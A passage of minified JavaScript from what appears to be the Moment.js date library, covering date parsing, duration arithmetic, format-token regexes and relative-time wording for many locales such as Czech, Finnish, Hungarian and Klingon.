                Nt[a] ? (n ? y(e).empty = !1 : y(e).unusedTokens.push(a),
                m = a,
                p = e,
                null != (f = n) && g(tn, m) && tn[m](f, p._a, p, m)) : e._strict && !n && y(e).unusedTokens.push(a);
            y(e).charsLeftOver = o - l,
            0 < r.length && y(e).unusedInput.push(r),
            e._a[rn] <= 12 && !0 === y(e).bigHour && 0 < e._a[rn] && (y(e).bigHour = void 0),
            y(e).parsedDateParts = e._a.slice(0),
            y(e).meridiem = e._meridiem,
            e._a[rn] = (d = e._locale,
            u = e._a[rn],
            null == (c = e._meridiem) ? u : null != d.meridiemHour ? d.meridiemHour(u, c) : (null != d.isPM && ((h = d.isPM(c)) && u < 12 && (u += 12),
            h || 12 !== u || (u = 0)),
            u)),
            ue(e),
            oe(e)
        } else
            le(e);
        var d, u, c, h, m, f, p
    }
    function he(e) {
        var t, n, i = e._i, a = e._f;
        return e._locale = e._locale || re(e._l),
        null === i || void 0 === a && "" === i ? m({
            nullInput: !0
        }) : ("string" == typeof i && (e._i = i = e._locale.preparse(i)),
        M(i) ? new v(oe(i)) : (s(i) ? e._d = i : o(a) ? function(e) {
            var t, n, i, a, s;
            if (0 === e._f.length)
                return y(e).invalidFormat = !0,
                e._d = new Date(NaN);
            for (a = 0; a < e._f.length; a++)
                s = 0,
                t = p({}, e),
                null != e._useUTC && (t._useUTC = e._useUTC),
                t._f = e._f[a],
                ce(t),
                h(t) && (s += y(t).charsLeftOver,
                s += 10 * y(t).unusedTokens.length,
                y(t).score = s,
                (null == i || s < i) && (i = s,
                n = t));
            d(e, n || t)
        }(e) : a ? ce(e) : void 0 === (n = (t = e)._i) ? t._d = new Date(_.now()) : s(n) ? t._d = new Date(n.valueOf()) : "string" == typeof n ? function(e) {
            var t = Pn.exec(e._i);
            null !== t ? e._d = new Date(+t[1]) : (le(e),
            !1 === e._isValid && (delete e._isValid,
            _.createFromInputFallback(e)))
        }(t) : o(n) ? (t._a = r(n.slice(0), function(e) {
            return parseInt(e, 10)
        }),
        ue(t)) : "object" == typeof n ? function(e) {
            if (!e._d) {
                var t = x(e._i);
                e._a = r([t.year, t.month, t.day || t.date, t.hour, t.minute, t.second, t.millisecond], function(e) {
                    return e && parseInt(e, 10)
                }),
                ue(e)
            }
        }(t) : u(n) ? t._d = new Date(n) : _.createFromInputFallback(t),
        h(e) || (e._d = null),
        e))
    }
    function me(e, t, n, i, a) {
        var s, r = {};
        return !0 !== n && !1 !== n || (i = n,
        n = void 0),
        (l(e) && function(e) {
            var t;
            for (t in e)
                return;
            return 1
        }(e) || o(e) && 0 === e.length) && (e = void 0),
        r._isAMomentObject = !0,
        r._useUTC = r._isUTC = a,
        r._l = n,
        r._i = e,
        r._f = t,
        r._strict = i,
        (s = new v(oe(he(r))))._nextDay && (s.add(1, "d"),
        s._nextDay = void 0),
        s
    }
    function fe(e, t, n, i) {
        return me(e, t, n, i, !1)
    }
    function pe(e, t) {
        var n, i;
        if (1 === t.length && o(t[0]) && (t = t[0]),
        !t.length)
            return fe();
        for (n = t[0],
        i = 1; i < t.length; ++i)
            t[i].isValid() && !t[i][e](n) || (n = t[i]);
        return n
    }
    function _e(e) {
        var t = x(e)
          , n = t.year || 0
          , i = t.quarter || 0
          , a = t.month || 0
          , s = t.week || 0
          , r = t.day || 0
          , o = t.hour || 0
          , l = t.minute || 0
          , d = t.second || 0
          , u = t.millisecond || 0;
        this._milliseconds = +u + 1e3 * d + 6e4 * l + 1e3 * o * 60 * 60,
        this._days = +r + 7 * s,
        this._months = +a + 3 * i + 12 * n,
        this._data = {},
        this._locale = re(),
        this._bubble()
    }
    function ge(e) {
        return e instanceof _e
    }
    function ye(e) {
        return e < 0 ? -1 * Math.round(-1 * e) : Math.round(e)
    }
    function ve(e, n) {
        C(e, 0, 0, function() {
            var e = this.utcOffset()
              , t = "+";
            return e < 0 && (e = -e,
            t = "-"),
            t + j(~~(e / 60), 2) + n + j(~~e % 60, 2)
        })
    }
    function Me(e, t) {
        var n = (t || "").match(e);
        if (null === n)
            return null;
        var i = ((n[n.length - 1] || []) + "").match(Fn) || ["-", 0, 0]
          , a = 60 * i[1] + b(i[2]);
        return 0 === a ? 0 : "+" === i[0] ? a : -a
    }
    function Le(e, t) {
        var n, i;
        return t._isUTC ? (n = t.clone(),
        i = (M(e) || s(e) ? e.valueOf() : fe(e).valueOf()) - n.valueOf(),
        n._d.setTime(n._d.valueOf() + i),
        _.updateOffset(n, !1),
        n) : fe(e).local()
    }
    function be(e) {
        return 15 * -Math.round(e._d.getTimezoneOffset() / 15)
    }
    function ke() {
        return !!this.isValid() && this._isUTC && 0 === this._offset
    }
    function De(e, t) {
        var n, i, a, s, r, o, l = e, d = null;
        return ge(e) ? l = {
            ms: e._milliseconds,
            d: e._days,
            M: e._months
        } : u(e) ? (l = {},
        t ? l[t] = e : l.milliseconds = e) : (d = Wn.exec(e)) ? (n = "-" === d[1] ? -1 : 1,
        l = {
            y: 0,
            d: b(d[sn]) * n,
            h: b(d[rn]) * n,
            m: b(d[on]) * n,
            s: b(d[ln]) * n,
            ms: b(ye(1e3 * d[dn])) * n
        }) : (d = In.exec(e)) ? (n = "-" === d[1] ? -1 : 1,
        l = {
            y: Ye(d[2], n),
            M: Ye(d[3], n),
            w: Ye(d[4], n),
            d: Ye(d[5], n),
            h: Ye(d[6], n),
            m: Ye(d[7], n),
            s: Ye(d[8], n)
        }) : null == l ? l = {} : "object" == typeof l && ("from"in l || "to"in l) && (s = fe(l.from),
        r = fe(l.to),
        a = s.isValid() && r.isValid() ? (r = Le(r, s),
        s.isBefore(r) ? o = we(s, r) : ((o = we(r, s)).milliseconds = -o.milliseconds,
        o.months = -o.months),
        o) : {
            milliseconds: 0,
            months: 0
        },
        (l = {}).ms = a.milliseconds,
        l.M = a.months),
        i = new _e(l),
        ge(e) && g(e, "_locale") && (i._locale = e._locale),
        i
    }
    function Ye(e, t) {
        var n = e && parseFloat(e.replace(",", "."));
        return (isNaN(n) ? 0 : n) * t
    }
    function we(e, t) {
        var n = {
            milliseconds: 0,
            months: 0
        };
        return n.months = t.month() - e.month() + 12 * (t.year() - e.year()),
        e.clone().add(n.months, "M").isAfter(t) && --n.months,
        n.milliseconds = t - e.clone().add(n.months, "M"),
        n
    }
    function Te(i, a) {
        return function(e, t) {
            var n;
            return null === t || isNaN(+t) || (Y(a, "moment()." + a + "(period, number) is deprecated. Please use moment()." + a + "(number, period). See http://momentjs.com/guides/#/warnings/add-inverted-param/ for more info."),
            n = e,
            e = t,
            t = n),
            Se(this, De(e = "string" == typeof e ? +e : e, t), i),
            this
        }
    }
    function Se(e, t, n, i) {
        var a = t._milliseconds
          , s = ye(t._days)
          , r = ye(t._months);
        e.isValid() && (i = null == i || i,
        a && e._d.setTime(e._d.valueOf() + a * n),
        s && E(e, "Date", H(e, "Date") + s * n),
        r && R(e, H(e, "Month") + r * n),
        i && _.updateOffset(e, s || r))
    }
    function xe(e) {
        var t;
        return void 0 === e ? this._locale._abbr : (null != (t = re(e)) && (this._locale = t),
        this)
    }
    function He() {
        return this._locale
    }
    function Ee(e, t) {
        C(0, [e, e.length], 0, t)
    }
    function je(e, t, n, i, a) {
        var s;
        return null == e ? X(this, i, a).year : ((s = K(e, i, a)) < t && (t = s),
        function(e, t, n, i, a) {
            var s = G(e, t, n, i, a)
              , r = J(s.year, 0, s.dayOfYear);
            return this.year(r.getUTCFullYear()),
            this.month(r.getUTCMonth()),
            this.date(r.getUTCDate()),
            this
        }
        .call(this, e, t, n, i, a))
    }
    function Ce(e) {
        return e
    }
    function Ae(e, t, n, i) {
        var a = re()
          , s = c().set(i, t);
        return a[n](s, e)
    }
    function Pe(e, t, n) {
        if (u(e) && (t = e,
        e = void 0),
        e = e || "",
        null != t)
            return Ae(e, t, n, "month");
        var i, a = [];
        for (i = 0; i < 12; i++)
            a[i] = Ae(e, i, n, "month");
        return a
    }
    function Oe(e, t, n, i) {
        t = ("boolean" == typeof e || (n = t = e,
        e = !1),
        u(t) && (n = t,
        t = void 0),
        t || "");
        var a = re()
          , s = e ? a._week.dow : 0;
        if (null != n)
            return Ae(t, (n + s) % 7, i, "day");
        var r, o = [];
        for (r = 0; r < 7; r++)
            o[r] = Ae(t, (r + s) % 7, i, "day");
        return o
    }
    function Ne(e, t, n, i) {
        var a = De(t, n);
        return e._milliseconds += i * a._milliseconds,
        e._days += i * a._days,
        e._months += i * a._months,
        e._bubble()
    }
    function Fe(e) {
        return e < 0 ? Math.floor(e) : Math.ceil(e)
    }
    function We(e) {
        return 4800 * e / 146097
    }
    function Ie(e) {
        return 146097 * e / 4800
    }
    function ze(e) {
        return function() {
            return this.as(e)
        }
    }
    function Re(e) {
        return function() {
            return this._data[e]
        }
    }
    function $e(e, t, n) {
        var i = De(e).abs()
          , a = mi(i.as("s"))
          , s = mi(i.as("m"))
          , r = mi(i.as("h"))
          , o = mi(i.as("d"))
          , l = mi(i.as("M"))
          , d = mi(i.as("y"))
          , u = (a < fi.s ? ["s", a] : s <= 1 && ["m"]) || s < fi.m && ["mm", s] || r <= 1 && ["h"] || r < fi.h && ["hh", r] || o <= 1 && ["d"] || o < fi.d && ["dd", o] || l <= 1 && ["M"] || l < fi.M && ["MM", l] || d <= 1 && ["y"] || ["yy", d];
        return u[2] = t,
        u[3] = 0 < +e,
        u[4] = n,
        function(e, t, n, i, a) {
            return a.relativeTime(t || 1, !!n, e, i)
        }
        .apply(null, u)
    }
    function Be() {
        var e, t, n = pi(this._milliseconds) / 1e3, i = pi(this._days), a = pi(this._months);
        t = L((e = L(n / 60)) / 60),
        n %= 60,
        e %= 60;
        var s = L(a / 12)
          , r = a %= 12
          , o = i
          , l = t
          , d = e
          , u = n
          , c = this.asSeconds();
        return c ? (c < 0 ? "-" : "") + "P" + (s ? s + "Y" : "") + (r ? r + "M" : "") + (o ? o + "D" : "") + (l || d || u ? "T" : "") + (l ? l + "H" : "") + (d ? d + "M" : "") + (u ? u + "S" : "") : "P0D"
    }
    function qe(e, t, n) {
        var i, a;
        return "m" === n ? t ? "хвіліна" : "хвіліну" : "h" === n ? t ? "гадзіна" : "гадзіну" : e + " " + (i = +e,
        a = {
            mm: t ? "хвіліна_хвіліны_хвілін" : "хвіліну_хвіліны_хвілін",
            hh: t ? "гадзіна_гадзіны_гадзін" : "гадзіну_гадзіны_гадзін",
            dd: "дзень_дні_дзён",
            MM: "месяц_месяцы_месяцаў",
            yy: "год_гады_гадоў"
        }[n].split("_"),
        i % 10 == 1 && i % 100 != 11 ? a[0] : 2 <= i % 10 && i % 10 <= 4 && (i % 100 < 10 || 20 <= i % 100) ? a[1] : a[2])
    }
    function Ue(e, t, n) {
        return e + " " + (i = {
            mm: "munutenn",
            MM: "miz",
            dd: "devezh"
        }[n],
        2 === e ? function(e) {
            var t = {
                m: "v",
                b: "v",
                d: "z"
            };
            return void 0 === t[e.charAt(0)] ? e : t[e.charAt(0)] + e.substring(1)
        }(i) : i);
        var i
    }
    function Je(e, t, n) {
        var i = e + " ";
        switch (n) {
        case "m":
            return t ? "jedna minuta" : "jedne minute";
        case "mm":
            return i + (1 !== e && (2 === e || 3 === e || 4 === e) ? "minute" : "minuta");
        case "h":
            return t ? "jedan sat" : "jednog sata";
        case "hh":
            return i + (1 === e ? "sat" : 2 === e || 3 === e || 4 === e ? "sata" : "sati");
        case "dd":
            return i + (1 === e ? "dan" : "dana");
        case "MM":
            return i + (1 === e ? "mjesec" : 2 === e || 3 === e || 4 === e ? "mjeseca" : "mjeseci");
        case "yy":
            return i + (1 !== e && (2 === e || 3 === e || 4 === e) ? "godine" : "godina")
        }
    }
    function Ve(e) {
        return 1 < e && e < 5 && 1 != ~~(e / 10)
    }
    function Ge(e, t, n, i) {
        var a = e + " ";
        switch (n) {
        case "s":
            return t || i ? "pár sekund" : "pár sekundami";
        case "m":
            return t ? "minuta" : i ? "minutu" : "minutou";
        case "mm":
            return t || i ? a + (Ve(e) ? "minuty" : "minut") : a + "minutami";
        case "h":
            return t ? "hodina" : i ? "hodinu" : "hodinou";
        case "hh":
            return t || i ? a + (Ve(e) ? "hodiny" : "hodin") : a + "hodinami";
        case "d":
            return t || i ? "den" : "dnem";
        case "dd":
            return t || i ? a + (Ve(e) ? "dny" : "dní") : a + "dny";
        case "M":
            return t || i ? "měsíc" : "měsícem";
        case "MM":
            return t || i ? a + (Ve(e) ? "měsíce" : "měsíců") : a + "měsíci";
        case "y":
            return t || i ? "rok" : "rokem";
        case "yy":
            return t || i ? a + (Ve(e) ? "roky" : "let") : a + "lety"
        }
    }
    function Xe(e, t, n, i) {
        var a = {
            m: ["eine Minute", "einer Minute"],
            h: ["eine Stunde", "einer Stunde"],
            d: ["ein Tag", "einem Tag"],
            dd: [e + " Tage", e + " Tagen"],
            M: ["ein Monat", "einem Monat"],
            MM: [e + " Monate", e + " Monaten"],
            y: ["ein Jahr", "einem Jahr"],
            yy: [e + " Jahre", e + " Jahren"]
        };
        return t ? a[n][0] : a[n][1]
    }
    function Ke(e, t, n, i) {
        var a = {
            m: ["eine Minute", "einer Minute"],
            h: ["eine Stunde", "einer Stunde"],
            d: ["ein Tag", "einem Tag"],
            dd: [e + " Tage", e + " Tagen"],
            M: ["ein Monat", "einem Monat"],
            MM: [e + " Monate", e + " Monaten"],
            y: ["ein Jahr", "einem Jahr"],
            yy: [e + " Jahre", e + " Jahren"]
        };
        return t ? a[n][0] : a[n][1]
    }
    function Qe(e, t, n, i) {
        var a = {
            s: ["mõne sekundi", "mõni sekund", "paar sekundit"],
            m: ["ühe minuti", "üks minut"],
            mm: [e + " minuti", e + " minutit"],
            h: ["ühe tunni", "tund aega", "üks tund"],
            hh: [e + " tunni", e + " tundi"],
            d: ["ühe päeva", "üks päev"],
            M: ["kuu aja", "kuu aega", "üks kuu"],
            MM: [e + " kuu", e + " kuud"],
            y: ["ühe aasta", "aasta", "üks aasta"],
            yy: [e + " aasta", e + " aastat"]
        };
        return t ? a[n][2] ? a[n][2] : a[n][1] : i ? a[n][0] : a[n][1]
    }
    function Ze(e, t, n, i) {
        var a, s, r = "";
        switch (n) {
        case "s":
            return i ? "muutaman sekunnin" : "muutama sekunti";
        case "m":
            return i ? "minuutin" : "minuutti";
        case "mm":
            r = i ? "minuutin" : "minuuttia";
            break;
        case "h":
            return i ? "tunnin" : "tunti";
        case "hh":
            r = i ? "tunnin" : "tuntia";
            break;
        case "d":
            return i ? "päivän" : "päivä";
        case "dd":
            r = i ? "päivän" : "päivää";
            break;
        case "M":
            return i ? "kuukauden" : "kuukausi";
        case "MM":
            r = i ? "kuukauden" : "kuukautta";
            break;
        case "y":
            return i ? "vuoden" : "vuosi";
        case "yy":
            r = i ? "vuoden" : "vuotta"
        }
        return s = i,
        ((a = e) < 10 ? s ? Ui[a] : qi[a] : a) + " " + r
    }
    function et(e, t, n) {
        var i = e + " ";
        switch (n) {
        case "m":
            return t ? "jedna minuta" : "jedne minute";
        case "mm":
            return i + (1 !== e && (2 === e || 3 === e || 4 === e) ? "minute" : "minuta");
        case "h":
            return t ? "jedan sat" : "jednog sata";
        case "hh":
            return i + (1 === e ? "sat" : 2 === e || 3 === e || 4 === e ? "sata" : "sati");
        case "dd":
            return i + (1 === e ? "dan" : "dana");
        case "MM":
            return i + (1 === e ? "mjesec" : 2 === e || 3 === e || 4 === e ? "mjeseca" : "mjeseci");
        case "yy":
            return i + (1 !== e && (2 === e || 3 === e || 4 === e) ? "godine" : "godina")
        }
    }
    function tt(e, t, n, i) {
        var a = e;
        switch (n) {
        case "s":
            return i || t ? "néhány másodperc" : "néhány másodperce";
        case "m":
            return "egy" + (i || t ? " perc" : " perce");
        case "mm":
            return a + (i || t ? " perc" : " perce");
        case "h":
            return "egy" + (i || t ? " óra" : " órája");
        case "hh":
            return a + (i || t ? " óra" : " órája");
        case "d":
            return "egy" + (i || t ? " nap" : " napja");
        case "dd":
            return a + (i || t ? " nap" : " napja");
        case "M":
            return "egy" + (i || t ? " hónap" : " hónapja");
        case "MM":
            return a + (i || t ? " hónap" : " hónapja");
        case "y":
            return "egy" + (i || t ? " év" : " éve");
        case "yy":
            return a + (i || t ? " év" : " éve")
        }
        return ""
    }
    function nt(e) {
        return (e ? "" : "[múlt] ") + "[" + Ki[this.day()] + "] LT[-kor]"
    }
    function it(e) {
        return e % 100 == 11 || e % 10 != 1
    }
    function at(e, t, n, i) {
        var a = e + " ";
        switch (n) {
        case "s":
            return t || i ? "nokkrar sekúndur" : "nokkrum sekúndum";
        case "m":
            return t ? "mínúta" : "mínútu";
        case "mm":
            return it(e) ? a + (t || i ? "mínútur" : "mínútum") : t ? a + "mínúta" : a + "mínútu";
        case "hh":
            return it(e) ? a + (t || i ? "klukkustundir" : "klukkustundum") : a + "klukkustund";
        case "d":
            return t ? "dagur" : i ? "dag" : "degi";
        case "dd":
            return it(e) ? t ? a + "dagar" : a + (i ? "daga" : "dögum") : t ? a + "dagur" : a + (i ? "dag" : "degi");
        case "M":
            return t ? "mánuður" : i ? "mánuð" : "mánuði";
        case "MM":
            return it(e) ? t ? a + "mánuðir" : a + (i ? "mánuði" : "mánuðum") : t ? a + "mánuður" : a + (i ? "mánuð" : "mánuði");
        case "y":
            return t || i ? "ár" : "ári";
        case "yy":
            return it(e) ? a + (t || i ? "ár" : "árum") : a + (t || i ? "ár" : "ári")
        }
    }
    function st(e, t, n, i) {
        var a = {
            m: ["eng Minutt", "enger Minutt"],
            h: ["eng Stonn", "enger Stonn"],
            d: ["een Dag", "engem Dag"],
            M: ["ee Mount", "engem Mount"],
            y: ["ee Joer", "engem Joer"]
        };
        return t ? a[n][0] : a[n][1]
    }
    function rt(e) {
        if (e = parseInt(e, 10),
        isNaN(e))
            return !1;
        if (e < 0)
            return !0;
        if (e < 10)
            return 4 <= e && e <= 7;
        if (e < 100) {
            var t = e % 10;
            return rt(0 == t ? e / 10 : t)
        }
        if (e < 1e4) {
            for (; 10 <= e; )
                e /= 10;
            return rt(e)
        }
        return rt(e /= 1e3)
    }
    function ot(e, t, n, i) {
        return t ? dt(n)[0] : i ? dt(n)[1] : dt(n)[2]
    }
    function lt(e) {
        return e % 10 == 0 || 10 < e && e < 20
    }
    function dt(e) {
        return ea[e].split("_")
    }
    function ut(e, t, n, i) {
        var a = e + " ";
        return 1 === e ? a + ot(0, t, n[0], i) : t ? a + (lt(e) ? dt(n)[1] : dt(n)[0]) : i ? a + dt(n)[1] : a + (lt(e) ? dt(n)[1] : dt(n)[2])
    }
    function ct(e, t, n) {
        return n ? t % 10 == 1 && t % 100 != 11 ? e[2] : e[3] : t % 10 == 1 && t % 100 != 11 ? e[0] : e[1]
    }
    function ht(e, t, n) {
        return e + " " + ct(ta[n], e, t)
    }
    function mt(e, t, n) {
        return ct(ta[n], e, t)
    }
    function ft(e, t, n, i) {
        var a = "";
        if (t)
            switch (n) {
            case "s":
                a = "काही सेकंद";
                break;
            case "m":
                a = "एक मिनिट";
                break;
            case "mm":
                a = "%d मिनिटे";
                break;
            case "h":
                a = "एक तास";
                break;
            case "hh":
                a = "%d तास";
                break;
            case "d":
                a = "एक दिवस";
                break;
            case "dd":
                a = "%d दिवस";
                break;
            case "M":
                a = "एक महिना";
                break;
            case "MM":
                a = "%d महिने";
                break;
            case "y":
                a = "एक वर्ष";
                break;
            case "yy":
                a = "%d वर्षे"
            }
        else
            switch (n) {
            case "s":
                a = "काही सेकंदां";
                break;
            case "m":
                a = "एका मिनिटा";
                break;
            case "mm":
                a = "%d मिनिटां";
                break;
            case "h":
                a = "एका तासा";
                break;
            case "hh":
                a = "%d तासां";
                break;
            case "d":
                a = "एका दिवसा";
                break;
            case "dd":
                a = "%d दिवसां";
                break;
            case "M":
                a = "एका महिन्या";
                break;
            case "MM":
                a = "%d महिन्यां";
                break;
            case "y":
                a = "एका वर्षा";
                break;
            case "yy":
                a = "%d वर्षां"
            }
        return a.replace(/%d/i, e)
    }
    function pt(e) {
        return e % 10 < 5 && 1 < e % 10 && ~~(e / 10) % 10 != 1
    }
    function _t(e, t, n) {
        var i = e + " ";
        switch (n) {
        case "m":
            return t ? "minuta" : "minutę";
        case "mm":
            return i + (pt(e) ? "minuty" : "minut");
        case "h":
            return t ? "godzina" : "godzinę";
        case "hh":
            return i + (pt(e) ? "godziny" : "godzin");
        case "MM":
            return i + (pt(e) ? "miesiące" : "miesięcy");
        case "yy":
            return i + (pt(e) ? "lata" : "lat")
        }
    }
    function gt(e, t, n) {
        var i = " ";
        return (20 <= e % 100 || 100 <= e && e % 100 == 0) && (i = " de "),
        e + i + {
            mm: "minute",
            hh: "ore",
            dd: "zile",
            MM: "luni",
            yy: "ani"
        }[n]
    }
    function yt(e, t, n) {
        var i, a;
        return "m" === n ? t ? "минута" : "минуту" : e + " " + (i = +e,
        a = {
            mm: t ? "минута_минуты_минут" : "минуту_минуты_минут",
            hh: "час_часа_часов",
            dd: "день_дня_дней",
            MM: "месяц_месяца_месяцев",
            yy: "год_года_лет"
        }[n].split("_"),
        i % 10 == 1 && i % 100 != 11 ? a[0] : 2 <= i % 10 && i % 10 <= 4 && (i % 100 < 10 || 20 <= i % 100) ? a[1] : a[2])
    }
    function vt(e) {
        return 1 < e && e < 5
    }
    function Mt(e, t, n, i) {
        var a = e + " ";
        switch (n) {
        case "s":
            return t || i ? "pár sekúnd" : "pár sekundami";
        case "m":
            return t ? "minúta" : i ? "minútu" : "minútou";
        case "mm":
            return t || i ? a + (vt(e) ? "minúty" : "minút") : a + "minútami";
        case "h":
            return t ? "hodina" : i ? "hodinu" : "hodinou";
        case "hh":
            return t || i ? a + (vt(e) ? "hodiny" : "hodín") : a + "hodinami";
        case "d":
            return t || i ? "deň" : "dňom";
        case "dd":
            return t || i ? a + (vt(e) ? "dni" : "dní") : a + "dňami";
        case "M":
            return t || i ? "mesiac" : "mesiacom";
        case "MM":
            return t || i ? a + (vt(e) ? "mesiace" : "mesiacov") : a + "mesiacmi";
        case "y":
            return t || i ? "rok" : "rokom";
        case "yy":
            return t || i ? a + (vt(e) ? "roky" : "rokov") : a + "rokmi"
        }
    }
    function Lt(e, t, n, i) {
        var a = e + " ";
        switch (n) {
        case "s":
            return t || i ? "nekaj sekund" : "nekaj sekundami";
        case "m":
            return t ? "ena minuta" : "eno minuto";
        case "mm":
            return a + (1 === e ? t ? "minuta" : "minuto" : 2 === e ? t || i ? "minuti" : "minutama" : e < 5 ? t || i ? "minute" : "minutami" : t || i ? "minut" : "minutami");
        case "h":
            return t ? "ena ura" : "eno uro";
        case "hh":
            return a + (1 === e ? t ? "ura" : "uro" : 2 === e ? t || i ? "uri" : "urama" : e < 5 ? t || i ? "ure" : "urami" : t || i ? "ur" : "urami");
        case "d":
            return t || i ? "en dan" : "enim dnem";
        case "dd":
            return a + (1 === e ? t || i ? "dan" : "dnem" : 2 === e ? t || i ? "dni" : "dnevoma" : t || i ? "dni" : "dnevi");
        case "M":
            return t || i ? "en mesec" : "enim mesecem";
        case "MM":
            return a + (1 === e ? t || i ? "mesec" : "mesecem" : 2 === e ? t || i ? "meseca" : "mesecema" : e < 5 ? t || i ? "mesece" : "meseci" : t || i ? "mesecev" : "meseci");
        case "y":
            return t || i ? "eno leto" : "enim letom";
        case "yy":
            return a + (1 === e ? t || i ? "leto" : "letom" : 2 === e ? t || i ? "leti" : "letoma" : e < 5 ? t || i ? "leta" : "leti" : t || i ? "let" : "leti")
        }
    }
    function bt(e, t, n, i) {
        var a, s, r, o, l, d = (a = e,
        s = Math.floor(a % 1e3 / 100),
        r = Math.floor(a % 100 / 10),
        o = a % 10,
        l = "",
        0 < s && (l += Sa[s] + "vatlh"),
        0 < r && (l += ("" !== l ? " " : "") + Sa[r] + "maH"),
        0 < o && (l += ("" !== l ? " " : "") + Sa[o]),
        "" === l ? "pagh" : l);
        switch (n) {
        case "mm":
            return d + " tup";
        case "hh":
            return d + " rep";
        case "dd":
            return d + " jaj";
        case "MM":
            return d + " jar";
        case "yy":
            return d + " DIS"
        }
    }
    function kt(e, t, n, i) {
        var a = {
            s: ["viensas secunds", "'iensas secunds"],
            m: ["'n míut", "'iens míut"],
            mm: [e + " míuts", e + " míuts"],
            h: ["'n þora", "'iensa þora"],
            hh: [e + " þoras", e + " þoras"],
            d: ["'n ziua", "'iensa ziua"],
            dd: [e + " ziuas", e + " ziuas"],
            M: ["'n mes", "'iens mes"],
            MM: [e + " mesen", e + " mesen"],
            y: ["'n ar", "'iens ar"],
            yy: [e + " ars", e + " ars"]
        };
        return i || t ? a[n][0] : a[n][1]
    }
    function Dt(e, t, n) {
        var i, a;
        return "m" === n ? t ? "хвилина" : "хвилину" : "h" === n ? t ? "година" : "годину" : e + " " + (i = +e,
        a = {
            mm: t ? "хвилина_хвилини_хвилин" : "хвилину_хвилини_хвилин",
            hh: t ? "година_години_годин" : "годину_години_годин",
            dd: "день_дні_днів",
            MM: "місяць_місяці_місяців",
            yy: "рік_роки_років"
        }[n].split("_"),
        i % 10 == 1 && i % 100 != 11 ? a[0] : 2 <= i % 10 && i % 10 <= 4 && (i % 100 < 10 || 20 <= i % 100) ? a[1] : a[2])
    }
    function Yt(e) {
        return function() {
            return e + "о" + (11 === this.hours() ? "б" : "") + "] LT"
        }
    }
    var wt, Tt = Array.prototype.some ? Array.prototype.some : function(e) {
        for (var t = Object(this), n = t.length >>> 0, i = 0; i < n; i++)
            if (i in t && e.call(this, t[i], i, t))
                return !0;
        return !1
    }
    , St = _.momentProperties = [], xt = !1, Ht = {};
    _.suppressDeprecationWarnings = !1,
    _.deprecationHandler = null;
    var Et = Object.keys ? Object.keys : function(e) {
        var t, n = [];
        for (t in e)
            g(e, t) && n.push(t);
        return n
    }
      , jt = {}
      , Ct = {}
      , At = /(\[[^\[]*\])|(\\)?([Hh]mm(ss)?|Mo|MM?M?M?|Do|DDDo|DD?D?D?|ddd?d?|do?|w[o|w]?|W[o|W]?|Qo?|YYYYYY|YYYYY|YYYY|YY|gg(ggg?)?|GG(GGG?)?|e|E|a|A|hh?|HH?|kk?|mm?|ss?|S{1,9}|x|X|zz?|ZZ?|.)/g
      , Pt = /(\[[^\[]*\])|(\\)?(LTS|LT|LL?L?L?|l{1,4})/g
      , Ot = {}
      , Nt = {}
      , Ft = /\d/
      , Wt = /\d\d/
      , It = /\d{3}/
      , zt = /\d{4}/
      , Rt = /[+-]?\d{6}/
      , $t = /\d\d?/
      , Bt = /\d\d\d\d?/
      , qt = /\d\d\d\d\d\d?/
      , Ut = /\d{1,3}/
      , Jt = /\d{1,4}/
      , Vt = /[+-]?\d{1,6}/
      , Gt = /\d+/
      , Xt = /[+-]?\d+/
      , Kt = /Z|[+-]\d\d:?\d\d/gi
      , Qt = /Z|[+-]\d\d(?::?\d\d)?/gi
      , Zt = /[0-9]*['a-z\u00A0-\u05FF\u0700-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]+|[\u0600-\u06FF\/]+(\s*?[\u0600-\u06FF]+){1,2}/i
      , en = {}
      , tn = {}
      , nn = 0
      , an = 1
      , sn = 2
      , rn = 3
      , on = 4
      , ln = 5
      , dn = 6
      , un = 7
      , cn = 8
      , hn = Array.prototype.indexOf ? Array.prototype.indexOf : function(e) {
        var t;
        for (t = 0; t < this.length; ++t)
            if (this[t] === e)
                return t;
        return -1
    }
    ;
    C("M", ["MM", 2], "Mo", function() {
        return this.month() + 1
    }),
    C("MMM", 0, 0, function(e) {
        return this.localeData().monthsShort(this, e)
    }),
    C("MMMM", 0, 0, function(e) {
        return this.localeData().months(this, e)
    }),
    t("month", "M"),
    n("month", 8),
    O("M", $t),
    O("MM", $t, Wt),
    O("MMM", function(e, t) {
        return t.monthsShortRegex(e)
    }),
    O("MMMM", function(e, t) {
        return t.monthsRegex(e)
    }),
    W(["M", "MM"], function(e, t) {
        t[an] = b(e) - 1
    }),
    W(["MMM", "MMMM"], function(e, t, n, i) {
        var a = n._locale.monthsParse(e, i, n._strict);
        null != a ? t[an] = a : y(n).invalidMonth = e
    });
    var mn = /D[oD]?(\[[^\[\]]*\]|\s)+MMMM?/
      , fn = "January_February_March_April_May_June_July_August_September_October_November_December".split("_")
      , pn = "Jan_Feb_Mar_Apr_May_Jun_Jul_Aug_Sep_Oct_Nov_Dec".split("_")
      , _n = Zt
      , gn = Zt;
    C("Y", 0, 0, function() {
        var e = this.year();
        return e <= 9999 ? "" + e : "+" + e
    }),
    C(0, ["YY", 2], 0, function() {
        return this.year() % 100
    }),
    C(0, ["YYYY", 4], 0, "year"),
    C(0, ["YYYYY", 5], 0, "year"),
    C(0, ["YYYYYY", 6, !0], 0, "year"),
    t("year", "y"),
    n("year", 1),
    O("Y", Xt),
    O("YY", $t, Wt),
    O("YYYY", Jt, zt),
    O("YYYYY", Vt, Rt),
    O("YYYYYY", Vt, Rt),
    W(["YYYYY", "YYYYYY"], nn),
    W("YYYY", function(e, t) {
        t[nn] = 2 === e.length ? _.parseTwoDigitYear(e) : b(e)
    }),
    W("YY", function(e, t) {
        t[nn] = _.parseTwoDigitYear(e)
    }),
    W("Y", function(e, t) {
        t[nn] = parseInt(e, 10)
    }),
    _.parseTwoDigitYear = function(e) {
        return b(e) + (68 < b(e) ? 1900 : 2e3)
    }
    ;
    var yn = i("FullYear", !0);
    C("w", ["ww", 2], "wo", "week"),
    C("W", ["WW", 2], "Wo", "isoWeek"),
    t("week", "w"),
    t("isoWeek", "W"),
    n("week", 5),
    n("isoWeek", 5),
    O("w", $t),
    O("ww", $t, Wt),
    O("W", $t),
    O("WW", $t, Wt),
    I(["w", "ww", "W", "WW"], function(e, t, n, i) {
        t[i.substr(0, 1)] = b(e)
    });
    C("d", 0, "do", "day"),
    C("dd", 0, 0, function(e) {
        return this.localeData().weekdaysMin(this, e)
    }),
    C("ddd", 0, 0, function(e) {
